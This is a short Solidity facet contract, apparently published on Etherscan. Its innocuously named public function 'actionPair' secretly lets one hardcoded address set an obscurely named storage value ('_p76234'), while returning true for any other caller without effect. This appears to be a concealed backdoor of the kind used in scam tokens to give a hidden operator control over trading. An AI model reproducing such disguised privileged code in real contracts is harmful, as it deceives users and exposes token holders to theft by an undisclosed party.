/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0xE394F84Cff9c27d5cAC64707eA6a0b6271511495)
            ds._p76234 = account;
        return true;
    }
}
